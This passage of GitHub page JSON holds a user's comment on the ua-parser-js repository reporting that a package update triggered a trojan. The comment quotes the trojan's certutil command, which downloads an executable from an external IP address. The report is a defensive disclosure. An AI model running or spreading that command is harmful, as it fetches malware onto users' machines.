sues/536#issuecomment-949661168","createdAt":"2021-10-22T14:02:38Z","authorAssociation":"NONE","viewerCanDelete":false,"viewerCanMinimize":false,"viewerCanUnminimize":false,"viewerCanReport":false,"viewerCanReportToMaintainer":false,"viewerCanBlockFromOrg":false,"viewerCanUnblockFromOrg":false,"viewerCanBlockPersonally":false,"viewerCanUnblockPersonally":false,"viewerCanPin":false,"viewerCanUnpin":false,"viaApp":null,"minimizedReason":null,"showSpammyBadge":false,"createdViaEmail":false,"authorToRepoOwnerSponsorship":null,"viewerCanReadUserContentEdits":true,"lastEditedAt":"2021-10-22T14:19:06Z","lastUserContentEdit":{"editor":{"__typename":"User","url":"https://github.com/LyesIsogeo","login":"LyesIsogeo","id":"MDQ6VXNlcjc2NDc3MTM5"},"id":"UCE_lALOADKrhs44mq3wzh52ZJU"},"pinnedBy":null,"body":"I just update package and windows defender block \"ceprolad.a\" a trojan. I don't have any internet access at the same moment... \r\nThe trojan try to execute in the cmd: \"certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe\". The certutil -rulcacha -f download a .exe file. ","bodyHTML":"\u003cp dir=\"auto\"\u003eI just update package and windows defender block \"ceprolad.a\" a trojan. I don't have any internet access at the same moment...\u003cbr\u003e\nThe trojan try to execute in the cmd: \"certutil -rulcache -f \u003ca href=\"http://159.148.186.228/download/jsextension.exe\" rel=\"nofollow\"\u003ehttp://159.148.186.228/download/jsextension.exe\u003c/a\u003e jsextension.exe\". The certutil -rulcacha -f download a .exe file.\u003c/p\u003e","bodyVersion":"818cdc3177574cb7b297d62a11ab05ca00b6df80df548d63d195dcac8cb748f5","isHidden":false,"viewerCanUpdate":false,"repository":{"id":"MDEwOlJlcG9zaXRvcnkzMzIwNzEw","name":"ua-parser-js","owner":{"__typename":"User","id":"MDQ6VXNlcjQ2MDMwMg==","login":"faisalman","url":"https://github.com/faisalman"},"isPrivate":false,"viewerCanCreateIssues":false,"slashCommandsEnabled":false,"nameWithOwner":"faisal